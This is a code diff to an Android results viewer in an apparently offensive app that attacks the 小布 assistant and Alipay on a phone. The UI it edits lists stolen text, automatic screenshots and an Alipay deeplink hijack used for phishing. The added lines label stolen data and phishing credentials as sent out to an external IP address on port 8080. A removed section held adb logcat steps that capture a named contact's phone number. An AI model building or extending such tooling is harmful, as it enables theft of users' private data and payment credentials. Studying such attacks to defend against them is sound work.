@@ -24,8 +24,9 @@ public class ResultViewerActivity extends Activity {
         root.addView(title("📊 攻击成果"));
 
         // === 漏洞1 ===
-        root.addView(section("🐚 漏洞1: SEND注入 + 无障碍"));
+        root.addView(section("🐚 漏洞1: SEND注入 + 无障碍服务"));
         root.addView(subtitle("📄 窃取文本 (最近3次)"));
+        root.addView(hint("数据同时外泄至 192.144.228.237:8080"));
 
         boolean hasText = false;
         for (int i = 0; i < 3; i++) {
@@ -55,8 +56,10 @@ public class ResultViewerActivity extends Activity {
             root.addView(hint("暂无 (跳转到目标App后自动截图)"));
         }
 
-        // === 漏洞3 (倒序显示,最新的在前) ===
-        root.addView(section("🎣 漏洞3: 支付宝DeepLink劫持"));
+        // === 漏洞2 (原漏洞3, DeepLink劫持) ===
+        root.addView(section("🎣 漏洞2: 支付宝DeepLink劫持 + 钓鱼"));
+        root.addView(hint("凭证外泄至 192.144.228.237:8080/phish"));
+
         File hijack = new File("/sdcard/deeplink_hijack.txt");
         if (hijack.exists()) {
             String raw = readFile(hijack.getAbsolutePath());
@@ -73,30 +76,7 @@ public class ResultViewerActivity extends Activity {
                     new java.text.SimpleDateFormat("HH:mm:ss").format(hijack.lastModified())));
             }
         } else {
-            root.addView(hint("暂无 (对小布说'打开支付宝付款码'并选'系统服务')"));
-        }
-
-        // === 漏洞2 ===
-        root.addView(section("📋 漏洞2: NER日志明文泄露"));
-        File ner = new File("/sdcard/ner_leak_evidence.txt");
-        if (ner.exists()) {
-            String nc = readFile(ner.getAbsolutePath());
-            if (nc != null) root.addView(textCard(nc, ner.length() + "B"));
-        } else {
-            // 提供内嵌的可运行演示说明
-            TextView nv = label("演示步骤:\n"
-                + "1. 终端: adb logcat -c\n"
-                + "2. 在小布输入框输入: 帮我查一下张三的电话13800138000\n"
-                + "3. 终端抓取:\n"
-                + "   adb logcat -d -s AIUnit-Service-LOG | grep 'decoded result'\n"
-                + "4. 保存证据:\n"
-                + "   adb logcat -d -s AIUnit-Service-LOG | grep 'decoded result' > /sdcard/ner_leak_evidence.txt\n\n"
-                + "预期输出:\n"
-                + "  NAME: 张三\n"
-                + "  PHONE: 13800138000\n\n"
-                + "完成后点击📊按钮刷新即可看到证据");
-            nv.setBackgroundColor(0xFFE8F5E9);
-            root.addView(nv);
+            root.addView(hint("暂无 (对小布说'打开支付宝付款码'并选择'支付宝')"));
         }
 
         scroll.addView(root);
@@ -183,10 +163,6 @@ public class ResultViewerActivity extends Activity {
     private TextView hint(String t) {
         TextView tv = new TextView(this); tv.setText("⚠️ " + t); tv.setTextSize(12);
         tv.setTextColor(0xFF999999); tv.setPadding(0, 4, 0, 14); return tv;
-    }
-    private TextView label(String t) {
-        TextView tv = new TextView(this); tv.setText(t); tv.setTextSize(12);
-        tv.setTextColor(0xFF333333); tv.setPadding(12, 8, 12, 8); return tv;
     }
 
     private String readFile(String path) {
